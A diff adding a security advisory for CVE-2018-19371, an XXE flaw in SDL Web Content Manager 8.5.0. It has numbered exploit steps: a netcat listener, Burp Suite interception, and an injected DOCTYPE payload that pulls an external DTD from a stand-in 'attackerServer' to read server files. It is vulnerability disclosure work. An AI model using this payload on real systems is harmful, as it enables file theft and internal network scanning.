@@ -1,0 +1,33 @@
+######################
+# Author Information #
+######################
+Author : Ahmed Elhady Mohamed
+twitter : @Ahmed__ELhady
+Company : Canon Security
+Date : 25/11/2018
+########################
+# Software Information #
+########################
+Affected Software : SDL Web Content Manager
+Version: Build 8.5.0
+Vendor: SDL Tridion
+Software website : https://www.sdl.com
+CVE Number: CVE-2018-19371
+###############
+# Description #
+###############
+SDL Web Content Manager build 8.5.0 is vulnerable to XXE vulnerability in SaveUserSettings web service. SaveUserSettings web service takes XML values as a parameter. The webservices allows and accepts XML external entity which allows an attacker to read sensitive files from the server. Moreover it can be used to perform network port scanning to internal network.
+#################
+# Exploit Steps #
+#################
+1- Access the application with any user account
+2- it will ask you to choose your language preferences
+3-the application sent a request to SaveUserSettings web service with XML content in the request body.
+4- open a port listener on the attacker server using netcat tool as the following: nc -lvp 80
+5- intercept the request using Burpsuite proxy tool
+6- inject the following payload in the beginning of the XML value.
+<!DOCTYPE cdl [<!ENTITY % asd SYSTEM \"http://attackerServer/xxe1.dtd\">%asd;%c;]>
+<cdl>&rrr;</cdl>
+7- The injected payload allows the server to fetch the xxe1.dtd resource from the hacker server.
+8- send the request to the server.
+9- The application server will connect to the attacker server
